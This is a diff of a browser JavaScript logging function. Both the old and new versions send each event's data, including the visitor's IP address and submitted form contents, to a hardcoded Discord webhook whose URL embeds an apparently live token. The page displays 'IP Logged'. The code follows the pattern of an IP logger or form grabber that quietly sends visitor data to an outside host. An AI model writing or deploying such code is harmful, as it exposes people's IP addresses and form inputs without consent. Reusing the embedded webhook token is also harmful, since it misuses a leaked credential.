@@ -1,27 +1,32 @@
 function logData(eventType, data) {
-    console.log(`[TEST LOG] ${eventType}:`, data);
+    console.log(`[LOG] ${eventType}:`, data);
 
-    // Update IP status if available
-    const status = document.getElementById('statusText');
-    if (status) status.textContent = `IP Logged: ${data.ip || 'N/A'}`;
-
-    // Send formatted embed to Discord webhook
+    // Send properly formatted payload
     fetch('https://discord.com/api/webhooks/1388139167103582218/OTZHoiUd0w-XiBleGI5w_U8iE2rfZuQhpA6AT7Yo8n-iofiK1xWQVaxqFjEx0WBPJ6rt', {
         method: 'POST',
         headers: { 'Content-Type': 'application/json' },
         body: JSON.stringify({
-            content: `📨 New **${eventType}**`,
-            embeds: [{
-                title: 'Submitted Data',
-                description: '```json\n' + JSON.stringify(data, null, 2) + '\n```',
-                color: 0x5865F2
-            }]
+            content: `📩 New **${eventType}** received!`,
+            embeds: [
+                {
+                    title: "Form Data",
+                    description: "```json\n" + JSON.stringify(data, null, 2) + "\n```",
+                    color: 0x5865F2
+                }
+            ]
         })
-    }).then(res => {
-        if (!res.ok) throw new Error(`Webhook failed: ${res.status}`);
-    }).catch(err => {
-        console.error('Webhook error:', err);
+    })
+    .then(res => {
+        if (!res.ok) throw new Error(`Discord webhook failed: ${res.status}`);
+        else console.log("✅ Webhook sent");
+    })
+    .catch(err => {
+        console.error("❌ Webhook error:", err);
     });
+
+    // Update IP status in UI (if present)
+    const status = document.getElementById('statusText');
+    if (status) status.textContent = `IP Logged: ${data.ip || 'N/A'}`;
 }
 
 document.addEventListener('DOMContentLoaded', function () {
